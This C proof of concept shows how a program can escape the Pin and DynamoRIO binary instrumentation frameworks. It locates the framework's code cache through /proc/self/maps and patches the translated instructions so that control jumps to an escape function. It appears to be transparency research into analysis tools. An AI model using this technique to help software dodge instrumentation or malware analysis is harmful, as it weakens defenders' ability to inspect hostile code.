/*
   Copyright (c) 2014, Cosmin Gorgovan <cosmin {at} linux-geek {dot} org>
   All rights reserved.

   Redistribution and use in source and binary forms, with or without
   modification, are permitted provided that the following conditions are met:

   1. Redistributions of source code must retain the above copyright notice,
      this list of conditions and the following disclaimer.

   2. Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in the
      documentation and/or other materials provided with the distribution.

   THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
   AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
   IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
   ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
   LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
   CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
   SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
   INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
   CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
   ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
   POSSIBILITY OF SUCH DAMAGE.
*/

/* PoC of escape on Pin and DynamoRIO. x86_64 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define debug(...) {}
//#define debug(...) printf(__VA_ARGS__)

#define MAX_MAPS_LEN (1024*1024)

char msg[] = "It's a trap!\n";
uint64_t msg_p = (uint64_t)msg;
char maps_s[MAX_MAPS_LEN];

void escape() {
  printf("Escaped!\n");
  exit(0);
}

void trap() {
  printf(msg);
}

int main() {
  char *start;
  char *end;
  char *buf;
  uint8_t *p;
  char read_p;
  
  FILE *maps = fopen("/proc/self/maps", "r");
  fread(maps_s, 1, MAX_MAPS_LEN, maps);
  buf = maps_s;
 
  trap();
 
  debug("Escape function: %p\n", &escape);
  debug("Searched pointer: 0x%llx\n", msg_p);
  debug("Mappings: \n%s", buf);
 
  while(sscanf(buf, "%llx-%llx %c\n", &start, &end, &read_p) == 3) {
    /* msg is in the .data segment, which should be linked at a low
       address; start will be on the stack, which is expected to be
       at a high adress. The code cache should be somewhere in between.
     */
    if (read_p == 'r' && start > msg && end < (char *)&start) {
      debug("%p - %p\n", start, end);
      
      p = start;
      while (p < (uint8_t*)end-6) {
        if (   p[0] == (uint8_t)((msg_p >> 0) & 0xFF)
            && p[1] == (uint8_t)((msg_p >> 8) & 0xFF)
            && p[2] == (uint8_t)((msg_p >> 16) & 0xFF)
            && p[3] == (uint8_t)((msg_p >> 24) & 0xFF))
        {
          printf("Found at %p\n", p);
          p--;
          p[0] = 0x68; // push &escape
          p[1] = (uint64_t)&escape & 0xFF;
          p[2] = ((uint64_t)&escape >> 8) & 0xFF;
          p[3] = ((uint64_t)&escape >> 16) & 0xFF;
          p[4] = ((uint64_t)&escape >> 24) & 0xFF;
          p[5] = 0xC3; // reti
          p++;
        }
        p++;
      }
    }
    
    buf = memchr(buf, '\n', maps_s + MAX_MAPS_LEN-buf);
    buf++;
  }
  
  trap();
}

